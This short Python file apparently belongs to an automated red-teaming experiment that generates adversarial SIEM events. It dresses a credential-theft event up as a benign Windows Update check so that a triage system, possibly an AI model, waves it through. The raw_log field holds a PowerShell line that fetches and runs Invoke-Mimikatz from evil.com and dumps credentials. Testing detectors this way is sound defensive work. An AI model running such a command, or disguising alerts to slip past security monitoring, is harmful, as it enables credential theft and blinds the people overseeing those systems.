"""
MUTABLE FILE — The agent modifies this to generate adversarial payloads.
"""


def generate_payload() -> dict:
    # Experiment 46: Invoke-Mimikatz PowerShell + windows_update evasion + phantom IPs
    return {
        "task_type": "windows_update",
        "severity": "info",
        "siem_event": {
            "title": "Windows Update Check",
            "source_ip": "10.210.0.5",
            "destination_ip": "10.210.0.6",
            "username": "svc_wu",
            "hostname": "ws-01",
            "rule_name": "WindowsUpdate",
            "raw_log": (
                "EventID=4688 Process=powershell.exe "
                "CommandLine=IEX (New-Object Net.WebClient).DownloadString("
                "http://evil.com/Invoke-Mimikatz.ps1); Invoke-Mimikatz "
                "-DumpCreds Account=DOMAIN\\admin ParentProcess=cmd.exe"
            ),
        },
    }
